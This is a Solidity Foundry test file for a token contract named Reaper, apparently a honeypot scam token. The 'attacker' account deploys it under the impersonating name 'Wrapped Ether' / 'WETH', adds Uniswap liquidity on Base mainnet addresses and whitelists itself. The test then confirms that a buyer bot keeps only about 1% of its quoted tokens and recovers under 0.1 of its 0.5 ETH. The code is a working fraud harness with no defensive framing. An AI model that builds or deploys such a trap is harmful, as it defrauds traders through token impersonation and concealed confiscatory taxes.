// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Reaper} from "../src/Reaper.sol";

interface IUniswapV2Factory {
    function createPair(address a, address b) external returns (address);
}
interface IUniswapV2Router02 {
    function addLiquidityETH(address token, uint a, uint b, uint c, address to, uint d)
        external payable returns (uint, uint, uint);
    function swapExactETHForTokens(uint a, address[] calldata p, address to, uint d)
        external payable returns (uint[] memory);
    function swapExactTokensForETH(uint a, uint b, address[] calldata p, address to, uint d)
        external returns (uint[] memory);
}

contract ReaperTest is Test {
    address constant WETH    = 0x4200000000000000000000000000000000000006;
    address constant FACTORY = 0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6;
    address constant ROUTER  = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24;

    Reaper  reaper;
    address pair;
    address attacker = address(0xA11CE);
    address bot      = address(0xB0B);

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.startPrank(attacker);
        reaper = new Reaper("Wrapped Ether", "WETH", 1_000_000e18, WETH, 0, 0, 1, address(0));
        pair = IUniswapV2Factory(FACTORY).createPair(address(reaper), WETH);
        reaper.setPair(pair);
        reaper.setWhitelist(attacker, true);
        reaper.approve(ROUTER, type(uint256).max);
        IUniswapV2Router02(ROUTER).addLiquidityETH{value: 2 ether}(
            address(reaper), 200_000e18, 0, 0, attacker, block.timestamp
        );
        vm.stopPrank();
    }

    function test_TrapFiresOnBotSell() public {
        vm.deal(bot, 10 ether);
        address[] memory p = new address[](2);
        p[0] = WETH; p[1] = address(reaper);

        vm.startPrank(bot);
        uint[] memory outs = IUniswapV2Router02(ROUTER).swapExactETHForTokens{value: 0.5 ether}(
            0, p, bot, block.timestamp
        );
        uint fullExpected = outs[1];                 // what the router THINKS the bot got
        uint held         = reaper.balanceOf(bot);   // what the bot ACTUALLY got (taxed)

        assertGt(held, 0, "bot bought tokens");
        assertTrue(reaper.armed(), "trap armed after first buy");
        assertLt(held, fullExpected / 10, "bot should only hold ~1% of tokens");

        emit log_named_decimal_uint("router quoted tokens", fullExpected, 18);
        emit log_named_decimal_uint("bot actually holds  ", held, 18);

        p[0] = address(reaper); p[1] = WETH;
        reaper.approve(ROUTER, type(uint256).max);
        uint ethBefore = bot.balance;
        IUniswapV2Router02(ROUTER).swapExactTokensForETH(held, 0, p, bot, block.timestamp);
        uint ethOut = bot.balance - ethBefore;
        vm.stopPrank();

        emit log_named_decimal_uint("ETH the bot put in ", 0.5 ether, 18);
        emit log_named_decimal_uint("ETH the bot got back", ethOut, 18);
        assertLt(ethOut, 0.1 ether, "bot should be rekt");
    }
}